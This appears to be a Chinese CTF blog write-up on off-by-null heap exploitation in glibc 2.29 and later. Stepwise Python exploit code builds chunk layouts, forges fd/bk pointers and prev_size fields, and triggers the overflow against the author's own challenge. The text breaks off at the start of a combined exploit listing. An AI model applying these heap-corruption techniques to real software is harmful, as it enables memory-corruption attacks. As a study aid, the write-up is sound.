<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_free中</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink中</span></span><br><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></div></figure>




        <h3 id="1-前置布局："   >
          <a href="#1-前置布局：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置布局：" class="headerlink" title="(1)前置布局："></a>(1)前置布局：</h3>
      <p>由于init-0师傅的题目中，申请chunk是从0x3a0开始的，所以这里我就也以0x3a0开始：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get layout to let chunk0_addr = 0x****3a0</span></span><br><span class="line">claim(<span class="number">0x88</span>)<span class="comment"># 0-6			#1-7</span></span><br><span class="line">claim(<span class="number">0x98</span>)<span class="comment"># 7-13			#8-14</span></span><br><span class="line">claim(<span class="number">0xa8</span>)<span class="comment"># 14-20			#15-21</span></span><br><span class="line">claim(<span class="number">0xb8</span>)<span class="comment"># 21-27			#22-28</span></span><br><span class="line">claim(<span class="number">0xc8</span>)<span class="comment"># 28-34			#29-35</span></span><br><span class="line">claim(<span class="number">0xd8</span>)<span class="comment"># 35-41			#36-42</span></span><br><span class="line">claim(<span class="number">0xe8</span>)<span class="comment"># 42-48			#43-49</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 49 				#50</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 50 				#51		0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 51  				#52 	0x****f9a0</span></span><br><span class="line">add_malloc(<span class="number">0xa8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52     0 			#53		0x****f9c0</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     1 			#54		0x****fa70</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 54     2 			#55		0x****fb30</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 55     			#56		</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 56     3 			#57		0x****fcf0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的</span></span><br><span class="line">fakeChunk_nextChunk_preSize = p64(<span class="number">0x200</span>) + p64(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">57</span>,<span class="number">0x10</span>,fakeChunk_nextChunk_preSize)<span class="comment"># 56			#57</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 57    4 			#58 	0x****fde0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 58 				#59</span></span><br><span class="line">add_malloc(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 59 				#60 	0x****ff70</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 60 				#61</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-填充tcache"   >
          <a href="#2-填充tcache" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-填充tcache" class="headerlink" title="(2)填充tcache"></a>(2)填充tcache</h3>
      <p>并且将要利用的Chunk释放合并进入unsortedbin</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#free 0~48 		#1~49</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):  <span class="comment">#0x88  	</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>,<span class="number">21</span>):<span class="comment">#0xa8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">42</span>):<span class="comment">#0xd8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line"><span class="comment">#--tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>,<span class="number">57</span>): <span class="comment">#52~56  				#53~57  merge into unsortedbin</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png" alt="Snipaste_2021-08-31_19-41-25"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk53&lt;br&gt;0xa8&lt;br&gt;0x****9c0)--&gt;1(chunk54&lt;br&gt;0xb8)--&gt;2(chunk55&lt;br&gt;0xd8)--&gt;3(chunk56&lt;br&gt;0xd8)--&gt;4(chunk57&lt;br&gt;0xe8&lt;br&gt;0x****cf0)</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-重构5357结构为97101"   >
          <a href="#3-重构5357结构为97101" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-重构5357结构为97101" class="headerlink" title="(3)重构5357结构为97101"></a>(3)重构53<del>57结构为97</del>101</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"><span class="comment"># empty tcache</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#62~68</span></span><br><span class="line">claim(<span class="number">0xa8</span>) <span class="comment">#69~75</span></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#76~82</span></span><br><span class="line">claim(<span class="number">0xd8</span>) <span class="comment">#83~89</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#90~96</span></span><br><span class="line"><span class="comment">#---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------- 上面是一个大的unsorted bin</span></span><br><span class="line"><span class="comment">#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 52 	#97  	#0x****9c0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 53     #98		#0x****A60</span></span><br><span class="line"></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span> * <span class="string">&quot;a&quot;</span> + p16(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1-&gt;0x200</span></span><br><span class="line"><span class="comment">#changing largebinChunk_size will not cause abort</span></span><br><span class="line">edit(<span class="number">98</span>,<span class="number">0x98</span>+<span class="number">0x2</span>,fake_chunk_size)<span class="comment">#53 #98</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#54 	#99 	#0x****B00</span></span><br><span class="line">add_malloc(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#55  #100 	#0x****B90</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#56  #101 	#0x****C70</span></span><br></pre></td></tr></table></div></figure>

<p>重构之后如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk97&lt;br&gt;0x98&lt;br&gt;0x****9c0)--&gt;1(chunk98&lt;br&gt;0x98)--&gt;2(chunk99&lt;br&gt;0x88)--&gt;3(chunk100&lt;br&gt;0x88)--&gt;4(chunk101&lt;br&gt;0xd8&lt;br&gt;0x****cf0)--&gt;5(0xe0碎片)</span><br></pre></td></tr></table></div></figure>

<p>那么实际上其实原先的0x420被申请了0x340，还有一部分0xe0没有被申请出来。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png" alt="Snipaste_2021-08-31_20-07-33"></p>

        <h3 id="4-构造preChunk的fd和bk"   >
          <a href="#4-构造preChunk的fd和bk" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-构造preChunk的fd和bk" class="headerlink" title="(4)构造preChunk的fd和bk"></a>(4)构造preChunk的fd和bk</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">51</span>)<span class="comment">#0x98 	#50  	#51 #0x****f900</span></span><br><span class="line"><span class="comment">#let 99-&gt;fd = chunk51_addr(0x****f900)</span></span><br><span class="line">free(<span class="number">99</span>)<span class="comment">#0x88  	#54 	#99</span></span><br><span class="line"><span class="comment">#let 99-&gt;bk = chunk60_addr(0x****ff70)</span></span><br><span class="line">free(<span class="number">60</span>)<span class="comment">#0xe8 	#59 	#60 #0x****ff70</span></span><br></pre></td></tr></table></div></figure>



<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png" alt="Snipaste_2021-08-31_20-40-24"></p>

        <h3 id="5-再重构97-101为97-gt-124-gt-132-gt-134"   >
          <a href="#5-再重构97-101为97-gt-124-gt-132-gt-134" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-再重构97-101为97-gt-124-gt-132-gt-134" class="headerlink" title="(5)再重构97~101为97-&gt;124-&gt;132-&gt;134"></a>(5)再重构97~101为97-&gt;124-&gt;132-&gt;134</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">98</span>)<span class="comment">#0x98 	#53 	#98</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line">claim(<span class="number">0x88</span>) <span class="comment">#102~108</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#109~115</span></span><br><span class="line">claim(<span class="number">0xe8</span>) <span class="comment">#116~122</span></span><br><span class="line"><span class="comment">#---------------add back</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块</span></span><br><span class="line"><span class="comment">#之后依据大小适配原则将60分配回来给123</span></span><br><span class="line">add_malloc(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x32		#123 0x****ff70,实际大小为0xf0</span></span><br><span class="line"><span class="comment">#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># 0x35  		#124 0x****fa60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):<span class="comment">#0x88</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块</span></span><br><span class="line">free(<span class="number">100</span>) 			<span class="comment">#55 	#100</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x88</span>)	<span class="comment">#125~131</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x36 	#132 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x37  	#133	0x****f900</span></span><br><span class="line">add_malloc(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3b 	#134 	0x****fbe0</span></span><br></pre></td></tr></table></div></figure>

<p>重构之后如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    0(chunk97&lt;br&gt;0x98&lt;br&gt;0x****f9c0)--&gt;1(chunk124&lt;br&gt;0xb8&lt;br&gt;chunk99被包含&lt;br&gt;0x****fa60)--&gt;2(chunk132&lt;br&gt;0xb8&lt;br&gt;0x****fb20)--&gt;3(chunk134&lt;br&gt;0x38&lt;br&gt;0x****fbe0)--&gt;4(0xe0碎片)</span><br></pre></td></tr></table></div></figure>


        <h3 id="6-修复FD-gt-bk和BK-gt-fd"   >
          <a href="#6-修复FD-gt-bk和BK-gt-fd" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-修复FD-gt-bk和BK-gt-fd" class="headerlink" title="(6)修复FD-&gt;bk和BK-&gt;fd"></a>(6)修复FD-&gt;bk和BK-&gt;fd</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#let 133-&gt;bk = chunk132_addr(0x****f900-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">133</span>) <span class="comment">#0x37 	#133 	0x****f900</span></span><br><span class="line">free(<span class="number">132</span>) <span class="comment">#0x36  	#132 	0x****fb20</span></span><br><span class="line"><span class="comment">#let 123-&gt;fd = chunk132_addr(0x****ff70-&gt;bk = 0x****fb20)</span></span><br><span class="line">free(<span class="number">123</span>) <span class="comment">#0x32 	#123  	0x****ff70</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="7-再重构为97-gt-124-gt-157-gt-134"   >
          <a href="#7-再重构为97-gt-124-gt-157-gt-134" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-再重构为97-gt-124-gt-157-gt-134" class="headerlink" title="(7)再重构为97-&gt;124-&gt;157-&gt;134"></a>(7)再重构为97-&gt;124-&gt;157-&gt;134</h3>
      <p>方便将<code>0x****ff70</code>和<code>0x****f900</code>的对于fd,bk进行off-by-null，使得0xb20变为0xb00。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">59</span>)  <span class="comment">#58		#59		0x****fed0</span></span><br><span class="line"><span class="comment">#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0x98</span>) 	<span class="comment">#135~141</span></span><br><span class="line">claim(<span class="number">0xb8</span>)		<span class="comment">#142~148</span></span><br><span class="line">claim(<span class="number">0xe8</span>) 	<span class="comment">#149~155</span></span><br><span class="line"></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x32 		#156 	0x****fed0	</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x36 		#157 	0x****fb20</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#0x37  		#158	0x****ffa0</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)		<span class="comment">#58  		#159 	0x****f900</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--top_chunk</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3d 			#160</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3e 			#161</span></span><br><span class="line">add_malloc(<span class="number">0x18</span>,<span class="string">&#x27;\x00&#x27;</span>)        <span class="comment">#0x3f 			#162</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">14</span>):<span class="comment">#0x98</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">28</span>):<span class="comment">#0xb8</span></span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#------tcache</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">161</span>) <span class="comment">#0x98 	#0x3e 		#161</span></span><br><span class="line">free(<span class="number">159</span>) <span class="comment">#0x98 	#58  		#159 	0x****f900</span></span><br><span class="line">free(<span class="number">157</span>) <span class="comment">#0xb8 	#0x36 		#157</span></span><br><span class="line">free(<span class="number">50</span>)  <span class="comment">#0x98 	#49 		#50 	0x****f860</span></span><br><span class="line"><span class="comment">#其中159和50合并为0x140大小的块放入unsortedbin中</span></span><br><span class="line"><span class="comment">#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120</span></span><br><span class="line"></span><br><span class="line">claim(<span class="number">0xb8</span>) <span class="comment">#163~169</span></span><br><span class="line">claim(<span class="number">0x98</span>) <span class="comment">#170~176</span></span><br><span class="line"><span class="comment">#----------------------------------------------------</span></span><br><span class="line">add_malloc(<span class="number">0xb8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#49 	#177</span></span><br><span class="line">add_malloc(<span class="number">0x98</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x36  	#178</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切割0x140的块</span></span><br><span class="line">add_malloc(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3a 	#179 	0x****f860</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#0x3e   	#180 	</span></span><br></pre></td></tr></table></div></figure>

<p>现在就可以通过chunk179来将<code>0x****f900</code>中的bk给改掉。</p>
<p>通过chunk156来将<code>0x****ff70</code>中的fd给改掉。</p>

        <h3 id="8-利用off-by-null得到最终布局"   >
          <a href="#8-利用off-by-null得到最终布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-利用off-by-null得到最终布局" class="headerlink" title="(8)利用off-by-null得到最终布局"></a>(8)利用off-by-null得到最终布局</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">partial_null_write = <span class="number">0x98</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line">partial_null_write += p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">156</span>,<span class="number">0x98</span>+<span class="number">0x8</span>+<span class="number">0x1</span>,partial_null_write+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x32  	#156</span></span><br><span class="line"></span><br><span class="line">partial_null_write = <span class="number">0xa8</span>*<span class="string">&#x27;c&#x27;</span></span><br><span class="line">edit(<span class="number">179</span>,<span class="number">0xa8</span>+<span class="number">0x1</span>,partial_null_write + <span class="string">&#x27;\x00&#x27;</span>) 		<span class="comment">#0x3a 		#179</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造pre_size</span></span><br><span class="line">fake_chunk_size = <span class="number">0x98</span>*<span class="string">&#x27;d&#x27;</span></span><br><span class="line">fake_chunk_size += p64(<span class="number">0x2e1</span>)</span><br><span class="line">edit(<span class="number">124</span>,<span class="number">0x98</span>+<span class="number">0x8</span>,fake_chunk_size) 	<span class="comment">#0x35 	#124</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="9-触发off-by-null"   >
          <a href="#9-触发off-by-null" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-触发off-by-null" class="headerlink" title="(9)触发off-by-null"></a>(9)触发off-by-null</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>,<span class="number">49</span>):<span class="comment">#0xe8</span></span><br><span class="line">    free(i+<span class="number">1</span>)    </span><br><span class="line">free(<span class="number">58</span>)</span><br></pre></td></tr></table></div></figure>


        <h3 id="▲总结"   >
          <a href="#▲总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲总结" class="headerlink" title="▲总结"></a>▲总结</h3>
      <p>①利用unsortedbin成链机制，合并unsortedbin中的chunk并且切割，这样就能保留住FD和BK了。</p>
<p>②再利用unsortedbin成链和切割的机制，就能修改到对应preChunk的FD和BK了，修改最后一个字节为\x00即可。</p>
<p>③由于2.29之后的添加的两项检查，所以需要注意的是伪造unsortedbinChunk的size时，也要伪造nextChunk的pre_size和pre_inuse位。</p>
<p>④太他丫的麻烦了，有这时间布局还不如肝其他题…..</p>
<p>再贴个汇总的exp，基于libc2.30，自己的题目：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 